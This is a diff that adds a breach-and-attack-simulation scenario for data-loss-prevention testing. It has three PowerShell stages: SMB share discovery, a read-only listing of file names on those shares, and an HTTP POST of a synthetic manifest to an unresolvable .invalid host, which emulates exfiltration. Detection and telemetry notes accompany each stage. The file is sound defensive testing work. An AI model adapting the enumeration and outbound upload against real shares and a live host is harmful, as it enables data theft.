@@ -1,0 +1,150 @@
+id: collection-network-share-exfil
+product_line: dlp
+name: Network Share Collection and Outbound Probe
+description: >
+  Telemetry-safe emulation of an adversary mapping the endpoint's SMB shares,
+  listing what is reachable on them, and attempting to send a manifest of that
+  inventory out of the network. Shares are only enumerated: no file content is
+  read or copied from any share. The outbound step targets an RFC-6761 .invalid
+  host and never resolves.
+
+  KILL CHAIN STAGES:
+    1. Share Discovery            — enumerate local SMB shares (T1135)
+    2. Share Content Listing      — list top-level file names on those shares, read-only (T1039)
+    3. Manifest Upload Attempt    — POST the listing to an RFC-6761 .invalid host (T1048.003)
+
+  SAFETY: No file content is read, copied, or modified. Stage 2 uses directory
+  listings only. Stage 3 sends a synthetic [BAS-SIM] manifest to a .invalid host
+  that cannot resolve. Windows only. Telemetry mode.
+author: Audspect Research
+executable: true
+local_check: false
+supported_os: [windows]
+tags:
+  - collection
+  - network-share
+  - exfiltration
+  - dlp
+  - data-theft
+  - t1135
+  - t1039
+  - t1048
+  - mitre
+mitre_phases:
+  - discovery
+  - collection
+  - exfiltration
+
+live_policy:
+  block_on_domain_controller: true
+  require_dc_reachable: false
+  max_spray_attempts: 0
+  spray_account_allowlist: []
+  execution_window: ""
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # Stage 1 — Share Discovery (T1135)
+  # ---------------------------------------------------------------------------
+  - name: "Share Exfil 1 — Network Share Discovery (T1135)"
+    technique_id: T1135
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Lists the host's own non-administrative SMB shares with Get-SmbShare. Read-only. Adversaries map shares before choosing which to collect from. Generates Security EID 5145 only when remote clients access the shares, and the PowerShell script block log (EID 4104) for the query itself."
+    telemetry:
+      - "PowerShell EID 4104: Get-SmbShare script block"
+      - "Sysmon EID 1: powershell.exe with share enumeration command line"
+    detection:
+      - "EDR: share enumeration from a non-admin user context followed by file listing — discovery IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $shares = @(Get-SmbShare | Where-Object { -not $_.Special })
+      Write-Output "EXEC T1135: enumerated $($shares.Count) non-special SMB share(s) on this host. Share discovery Stage 1. [BAS-SIM-SHR-S1]"
+      if ($shares.Count -gt 0) {
+        Write-Output "FAIL: Share enumeration ran with no alert. Discovery of this kind from a user context should be flagged before any collection begins."
+      } else {
+        Write-Output "PASS: No non-special shares present on this host, so there is nothing for this stage to enumerate."
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 2 — Share Content Listing, read-only (T1039)
+  # ---------------------------------------------------------------------------
+  - name: "Share Exfil 2 — Read-Only Share Content Listing (T1039)"
+    technique_id: T1039
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 45
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Lists the names of top-level files in each non-special local share directory. Reads no file content, copies nothing, and does not recurse. The listing is what an adversary would use to pick collection targets. Generates Sysmon EID 11 only if a file is created, which this step never does."
+    telemetry:
+      - "Security EID 5145: share object access, when listed remotely"
+      - "PowerShell EID 4104: Get-ChildItem against share paths"
+    detection:
+      - "DLP/EDR: bulk directory listing across several shares in one short window — collection-staging precursor"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $shares = @(Get-SmbShare | Where-Object { -not $_.Special })
+      if ($shares.Count -eq 0) {
+        Write-Output "SKIP: T1039: no non-special shares to list. Share listing Stage 2 not applicable on this host. [BAS-SIM-SHR-S2]"
+        exit 0
+      }
+      $total = 0
+      foreach ($s in $shares) {
+        $total += @(Get-ChildItem -Path $s.Path -File -ErrorAction SilentlyContinue | Select-Object -First 500).Count
+      }
+      Write-Output "EXEC T1039: listed $total top-level file name(s) across $($shares.Count) share(s). No content read or copied. Share listing Stage 2. [BAS-SIM-SHR-S2]"
+      if ($total -gt 0) {
+        Write-Output "FAIL: Bulk listing of file names across several shares raised no alert. Collection targeting from share inventory is a precursor the DLP and EDR should see."
+      } else {
+        Write-Output "PASS: No files were visible on the shares to list."
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 3 — Manifest Upload Attempt to .invalid (T1048.003)
+  # ---------------------------------------------------------------------------
+  - name: "Share Exfil 3 — Share Manifest Upload Attempt to .invalid (T1048.003)"
+    technique_id: T1048.003
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Sends a synthetic [BAS-SIM] manifest line to an RFC-6761 .invalid host over HTTP. The host cannot resolve, so no data leaves the host. Generates Sysmon EID 22 (DNS query) and EID 3 (connection attempt)."
+    telemetry:
+      - "Sysmon EID 22: DNS query for the bas-sim .invalid host"
+      - "Proxy/egress log: outbound POST attempt with a manifest-shaped body"
+    detection:
+      - "Egress filter: POST to an unknown host with a manifest-shaped body — exfil attempt"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $target = "http://bas-sim-shr-$runId.invalid/upload"
+      $body = "[BAS-SIM] share manifest run=$runId synthetic_listing_only=true"
+      $reached = $false
+      try {
+        $r = Invoke-WebRequest -Uri $target -Method Post -Body $body -TimeoutSec 10 -UseBasicParsing
+        if ($r.StatusCode) { $reached = $true }
+      } catch { $reached = $false }
+      Write-Output "EXEC T1048.003: attempted HTTP POST of a synthetic manifest to $target. reached=$reached (expected: false). Manifest upload Stage 3. [BAS-SIM-SHR-S3]"
+      if ($reached) {
+        Write-Output "FAIL: An outbound POST to an unknown host with a manifest-shaped body succeeded. Egress filtering is not stopping share inventory from leaving the network."
+      } else {
+        Write-Output "FAIL: The endpoint issued an outbound POST to an unknown host with a manifest-shaped body. Unreachable only because the domain is .invalid; the attempt itself is the signal egress controls should alert on."
+      }
+    cleanup: ""
